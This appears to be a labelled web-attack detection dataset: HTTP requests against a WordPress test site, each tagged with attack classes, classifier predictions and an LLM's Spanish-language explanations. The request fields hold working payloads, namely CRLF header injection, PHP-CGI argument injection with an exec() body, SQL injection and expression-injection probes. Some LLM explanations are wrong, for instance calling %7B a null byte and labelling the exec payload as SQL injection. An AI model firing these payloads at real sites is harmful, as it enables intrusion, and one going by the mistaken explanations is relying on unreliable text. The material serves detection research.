timestamp,src_ip,src_port,dst_ip,dst_port,request_http_method,request_http_request,request_http_protocol,request_user_agent,request_referer,request_host,request_origin,request_cookie,request_content_type,request_accept,request_accept_language,request_accept_encoding,request_do_not_track,request_connection,request_body,response_http_protocol,response_http_status_code,response_http_status_message,response_content_length,000 - Normal,272 - Protocol Manipulation,242 - Code Injection,88 - OS Command Injection,126 - Path Traversal,66 - SQL Injection,16 - Dictionary-based Password Attack,310 - Scanning for Vulnerable Software,153 - Input Data Manipulation,274 - HTTP Verb Tampering,194 - Fake the Source of Data,34 - HTTP Response Splitting,33 - HTTP Request Smuggling,text_input,__row_id__,pred__000_Normal,pred__272_Protocol_Manipulation,pred__242_Code_Injection,pred__88_OS_Command_Injection,pred__126_Path_Traversal,pred__66_SQL_Injection,pred__16_Dictionary_based_Password_Attack,pred__310_Scanning_for_Vulnerable_Software,pred__153_Input_Data_Manipulation,pred__274_HTTP_Verb_Tampering,pred__194_Fake_the_Source_of_Data,pred__34_HTTP_Response_Splitting,pred__33_HTTP_Request_Smuggling,llm_labels,llm_reason,llm_status,llm_raw_response
18/Jul/2020:07:56:27 +0200,172.26.0.1,51829.0,172.26.0.4,80.0,POST,/blog/index.php/my-account/any%0D%0ASet-cookie%3A+Tamper%3Da7fc6874-010c-403e-8487-f0f17754fe86%0D%0A?mode=grid,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/blog/index.php/my-account/edit-profile/?mode=grid,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=growth; wordpress_test_cookie=WP+Cookie+check,application/x-www-form-urlencoded,,,,,,username=goofyChowder8&password=WB_tOWY3&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,HTTP/1.1,404.0,Not Found,53918.0,0,0,0,0,0,0,0,0,0,0,0,1,0,request_http_method: POST | request_http_request: /blog/index.php/my-account/any%0D%0ASet-cookie%3A+Tamper%3Da7fc6874-010c-403e-8487-f0f17754fe86%0D%0A?mode=grid | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/edit-profile/?mode=grid | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=growth; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: username=goofyChowder8&password=WB_tOWY3&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2F%3Fmode%3Dgrid&login=Login&redirect=&rememberme=forever,51,0,0,0,0,0,0,0,0,0,0,0,1,0,34 - HTTP Response Splitting,Se detecta la inyección de headers Set-cookie con CRLF (%0D%0A) en el cuerpo del POST.,ok,"{
  ""labels"": [""34 - HTTP Response Splitting""],
  ""reason"": ""Se detecta la inyección de headers Set-cookie con CRLF (%0D%0A) en el cuerpo del POST.""
}"
18/Jul/2020:08:02:24 +0200,172.26.0.1,51907.0,172.26.0.4,80.0,GET,/blog/index.php/sample-page/any%0ASet-cookie%3A+Tamper%3D23e41759-5436-46f2-88ed-0461d005d268,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/blog/index.php/sample-page/ut-aspernatur-est-dolores/,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=people; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,,,,,,,,HTTP/1.1,404.0,Not Found,58226.0,0,0,0,0,0,0,0,0,0,0,0,1,0,request_http_method: GET | request_http_request: /blog/index.php/sample-page/any%0ASet-cookie%3A+Tamper%3D23e41759-5436-46f2-88ed-0461d005d268 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/sample-page/ut-aspernatur-est-dolores/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=people; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,52,0,0,0,0,0,0,0,0,0,0,0,1,0,34 - HTTP Response Splitting,Se detecta la inyección de CRLF con 'Set-cookie' inyectado.,ok,"{
  ""labels"": [""34 - HTTP Response Splitting""],
  ""reason"": ""Se detecta la inyección de CRLF con 'Set-cookie' inyectado.""
}"
18/Jul/2020:08:10:50 +0200,172.26.0.1,51986.0,172.26.0.4,80.0,GET,/blog/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=any%0ASet-cookie%3A+Tamper%3D4063d31c-95a0-4120-8ae6-67b579ba879e,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=difficulty; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7Cd122f759409d41854b32363b5bb9c126b1f46a7ab5f083acee963ea5be5e9031,,,,,,,,HTTP/1.1,200.0,OK,732.0,0,0,0,0,0,0,0,0,0,0,0,1,1,request_http_method: GET | request_http_request: /blog/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=any%0ASet-cookie%3A+Tamper%3D4063d31c-95a0-4120-8ae6-67b579ba879e | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=difficulty; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7Cd122f759409d41854b32363b5bb9c126b1f46a7ab5f083acee963ea5be5e9031,53,0,0,0,0,0,0,0,0,0,0,0,1,0,34 - HTTP Response Splitting,"Se detecta la inyección de CRLF (%0A) en el header Set-cookie, lo cual es una señal clara de intento de HTTP Response Splitting.",ok,"{
  ""labels"": [""34 - HTTP Response Splitting""],
  ""reason"": ""Se detecta la inyección de CRLF (%0A) en el header Set-cookie, lo cual es una señal clara de intento de HTTP Response Splitting.""
}"
18/Jul/2020:08:15:02 +0200,172.26.0.1,52021.0,172.26.0.4,80.0,GET,/blog/wp-content/any%0D%0ASet-cookie%3A+Tamper%3D74cb6e5a-d222-48a2-9384-98e06344d61f%0D%0A/user-registration/assets/js/jquery-tiptip/jquery.tipTip.min.js?ver=1.3.0,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=week; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,,,,,,,,HTTP/1.1,404.0,Not Found,276.0,0,0,0,0,0,0,0,0,0,0,0,1,0,request_http_method: GET | request_http_request: /blog/wp-content/any%0D%0ASet-cookie%3A+Tamper%3D74cb6e5a-d222-48a2-9384-98e06344d61f%0D%0A/user-registration/assets/js/jquery-tiptip/jquery.tipTip.min.js?ver=1.3.0 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=week; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,54,0,0,0,0,0,0,0,0,1,0,0,1,0,34 - HTTP Response Splitting;153 - Input Data Manipulation,Se detecta la inyección de CRLF y un parámetro malformado con null byte.,ok,"{
  ""labels"": [""34 - HTTP Response Splitting"", ""153 - Input Data Manipulation""],
  ""reason"": ""Se detecta la inyección de CRLF y un parámetro malformado con null byte.""
}"
18/Jul/2020:08:21:13 +0200,172.26.0.1,52096.0,172.26.0.4,80.0,GET,/blog/wp-content/uploads/2020/04/any%0D%0ASet-cookie%3A+Tamper%3D87c5d9df-65a0-4de1-9972-83c0d291ca60%0D%0A,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=skill; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,,,,,,,,HTTP/1.1,404.0,Not Found,276.0,0,0,0,0,0,0,0,0,0,0,0,1,0,request_http_method: GET | request_http_request: /blog/wp-content/uploads/2020/04/any%0D%0ASet-cookie%3A+Tamper%3D87c5d9df-65a0-4de1-9972-83c0d291ca60%0D%0A | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=skill; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,55,0,0,0,0,0,0,0,0,0,0,0,1,0,34 - HTTP Response Splitting,"Se detecta el uso de CRLF (%0D%0A) para inyectar un Set-cookie, lo cual es una señal clara de intento de HTTP Response Splitting.",ok,"{
  ""labels"": [""34 - HTTP Response Splitting""],
  ""reason"": ""Se detecta el uso de CRLF (%0D%0A) para inyectar un Set-cookie, lo cual es una señal clara de intento de HTTP Response Splitting.""
}"
18/Jul/2020:08:24:02 +0200,172.26.0.1,52138.0,172.26.0.4,80.0,GET,/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=any%0ASet-cookie%3A+Tamper%3D60e03a0a-e72d-4c9e-8ca2-4b4fd8dc7014,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=debate; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,,,,,,,,HTTP/1.1,200.0,OK,10056.0,0,0,0,0,0,0,0,0,0,0,0,1,1,request_http_method: GET | request_http_request: /blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=any%0ASet-cookie%3A+Tamper%3D60e03a0a-e72d-4c9e-8ca2-4b4fd8dc7014 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=debate; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595224674%7CzQ0XdL9DZ69P04IlbgKMI9h0QkAGyMvYpQySOy6Zo7N%7C711e63dc516500f07f518261ec8b122694b4d930a445055acb84f946fb072ab6,56,0,0,0,0,0,0,0,0,0,0,0,1,1,33 - HTTP Request Smuggling;34 - HTTP Response Splitting,Se detecta el uso de CRLF en 'Set-cookie' y '%0A' que sugiere manipulación del cuerpo POST y inyección de headers.,ok,"{
  ""labels"": [""33 - HTTP Request Smuggling"", ""34 - HTTP Response Splitting""],
  ""reason"": ""Se detecta el uso de CRLF en 'Set-cookie' y '%0A' que sugiere manipulación del cuerpo POST y inyección de headers.""
}"
18/Jul/2020:10:36:09 +0200,172.26.0.1,64625.0,172.26.0.4,80.0,POST,/blog/index.php/my-account/lost-password/,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,ejkzqovzwwsmbsnqcbwvvsycbetlxdrjjollkw,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=product; wordpress_test_cookie=WP+Cookie+check,application/x-www-form-urlencoded,,,,,,user_login=morbidHyena5&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,HTTP/1.1,302.0,Found,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,request_http_method: POST | request_http_request: /blog/index.php/my-account/lost-password/ | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: ejkzqovzwwsmbsnqcbwvvsycbetlxdrjjollkw | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=product; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: user_login=morbidHyena5&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,57,1,0,0,0,0,0,0,0,0,0,0,0,0,000 - Normal,"La petición contiene solo un intento de restablecimiento de contraseña, sin señales técnicas claras de ataque.",ok,"{
  ""labels"": [""000 - Normal""],
  ""reason"": ""La petición contiene solo un intento de restablecimiento de contraseña, sin señales técnicas claras de ataque.""
}"
18/Jul/2020:12:01:35 +0200,172.26.0.1,64237.0,172.26.0.4,80.0,GET,/blog/index.php/tag/nihil-ut-deleniti-est/,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=health; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595239204%7C6akcEBUOHyf79ySte8YMfnyz46udOTkHD7bwygIDCVx%7C6a7485d61d8c54015aaed2511fbec7a4276581e79608f0367d7cac8378d15606,,,,,,,,HTTP/1.1,200.0,OK,63331.0,0,1,0,0,0,0,0,0,0,0,0,0,0,request_http_method: GET | request_http_request: /blog/index.php/tag/nihil-ut-deleniti-est/ | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=health; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595239204%7C6akcEBUOHyf79ySte8YMfnyz46udOTkHD7bwygIDCVx%7C6a7485d61d8c54015aaed2511fbec7a4276581e79608f0367d7cac8378d15606,58,1,0,0,0,0,0,0,0,0,0,0,0,0,000 - Normal,"La petición parece normal, sin señales técnicas claras de ataque.",ok,"{
  ""labels"": [""000 - Normal""],
  ""reason"": ""La petición parece normal, sin señales técnicas claras de ataque.""
}"
18/Jul/2020:12:10:39 +0200,172.26.0.1,64839.0,172.26.0.4,80.0,POST,/blog/index.php/my-account/edit-profile/%7B%7B%20data.link%20%7D%7D?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=cancer; wordpress_test_cookie=WP+Cookie+check,application/x-www-form-urlencoded,,,,,,"<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",HTTP/1.1,404.0,Not Found,53918.0,0,0,1,1,0,0,0,0,0,0,0,0,1,"request_http_method: POST | request_http_request: /blog/index.php/my-account/edit-profile/%7B%7B%20data.link%20%7D%7D?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=cancer; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",59,0,0,1,0,0,0,0,0,1,0,0,0,0,242 - Code Injection;153 - Input Data Manipulation,La petición contiene inyección de código PHP y manipulación de entrada con null byte.,ok,"{
  ""labels"": [""242 - Code Injection"", ""153 - Input Data Manipulation""],
  ""reason"": ""La petición contiene inyección de código PHP y manipulación de entrada con null byte.""
}"
18/Jul/2020:12:10:51 +0200,172.26.0.1,64838.0,172.26.0.4,80.0,POST,/blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=anxiety; wordpress_test_cookie=WP+Cookie+check,application/x-www-form-urlencoded,,,,,,"<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",HTTP/1.1,200.0,OK,64135.0,0,0,1,1,0,0,0,0,0,0,0,0,1,"request_http_method: POST | request_http_request: /blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=anxiety; wordpress_test_cookie=WP+Cookie+check | request_content_type: application/x-www-form-urlencoded | request_body: <?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(""",60,0,0,1,0,0,1,0,0,0,0,0,0,0,242 - Code Injection;66 - SQL Injection,"Peticion POST con contenido PHP inyectado y uso de exec para comandos del sistema, indicativos de inyeccion de codigo y SQL.",ok,"{
  ""labels"": [""242 - Code Injection"", ""66 - SQL Injection""],
  ""reason"": ""Peticion POST con contenido PHP inyectado y uso de exec para comandos del sistema, indicativos de inyeccion de codigo y SQL.""
}"
18/Jul/2020:14:53:52 +0200,172.26.0.1,62624.0,172.26.0.4,80.0,GET,/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/blog/index.php/page/2/,test-site.com,,comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=argument; wordpress_test_cookie=WP+Cookie+check,,,,,,Close,,HTTP/1.1,404.0,Not Found,276.0,0,0,0,0,0,1,0,0,0,0,0,0,0,request_http_method: GET | request_http_request: /blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/page/2/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=argument; wordpress_test_cookie=WP+Cookie+check,61,0,0,0,0,0,1,0,0,0,0,0,0,0,66 - SQL Injection,Peticion GET con payload SQL UNION SELECT,ok,"{
  ""labels"": [""66 - SQL Injection""],
  ""reason"": ""Peticion GET con payload SQL UNION SELECT""
}"
18/Jul/2020:15:16:40 +0200,172.26.0.1,55399.0,172.26.0.4,80.0,GET,/blog%29%29+ORDER+BY+1--+-/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,,test-site.com,,,,,,,,Close,,HTTP/1.1,404.0,Not Found,276.0,0,0,0,0,0,1,0,0,0,0,0,0,0,request_http_method: GET | request_http_request: /blog%29%29+ORDER+BY+1--+-/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,62,0,0,0,0,0,0,0,0,1,0,0,0,0,153 - Input Data Manipulation,Se observa el uso de null byte y posible manipulación de entrada en el path URL.,ok,"{
  ""labels"": [""153 - Input Data Manipulation""],
  ""reason"": ""Se observa el uso de null byte y posible manipulación de entrada en el path URL.""
}"
19/Jul/2020:11:29:08 +0200,172.26.0.1,53446.0,172.26.0.4,80.0,GET,/blog/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=%24%7B686703%2B495597%7D,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0,http://test-site.com/,test-site.com,,wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595323524%7C6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR%7Cbabde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP+Cookie+check,,,,,,,,HTTP/1.1,200.0,OK,5836.0,0,0,0,1,0,0,0,0,0,0,0,0,0,request_http_method: GET | request_http_request: /blog/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=%24%7B686703%2B495597%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/ | request_host: test-site.com | request_cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595323524%7C6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR%7Cbabde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP+Cookie+check,63,0,0,0,0,0,0,0,0,1,0,0,0,0,153 - Input Data Manipulation,"Se utiliza null byte (%7B) en el parámetro query, lo cual es una señal de manipulación general de entrada.",ok,"{
  ""labels"": [""153 - Input Data Manipulation""],
  ""reason"": ""Se utiliza null byte (%7B) en el parámetro query, lo cual es una señal de manipulación general de entrada.""
}"
